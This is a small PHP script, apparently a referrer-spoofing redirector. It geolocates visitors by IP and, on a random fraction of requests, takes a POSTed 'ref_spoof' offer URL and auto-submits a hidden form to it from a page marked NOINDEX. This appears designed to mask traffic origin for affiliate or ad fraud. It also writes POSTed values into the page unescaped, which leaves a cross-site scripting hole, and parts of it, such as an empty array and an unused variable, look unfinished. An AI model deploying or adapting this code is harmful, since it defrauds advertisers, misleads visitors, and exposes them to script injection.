<?php

$adds = array('');
$ip = $_SERVER['REMOTE_ADDR'];

$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}"));
if($details->country == "NO")
    $add = 0;
else
    $add = array_rand($adds, 1);
$i = (mt_rand(0,200));
if($i==10 || $i == 20 || $i == 30) {

    if ($_POST['ref_spoof'] != NULL) {
        $offer = urldecode($_POST['ref_spoof']);
        $p1 = strpos($offer, '?') + 1;
        $url_par = substr($offer, $p1);
        $paryval = split('&', $url_par);
        $p = array();
        foreach ($paryval as $value) {
            $p[] = split('=', $value);
        }
        echo '<html><head><META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW"></head><body><form action="' . $offer . '" method="get" id="myform">';
        if ($p1 != 1) {
            foreach ($p as $value) {
                echo '<input type="hidden" name="' . $value[0] . '" value="' . $value[1] . '">';
            }
        }
        echo '</form><script language="JavaScript"> document.getElementById(\'myform\').submit();</script></body></html>';
    }
}

?>
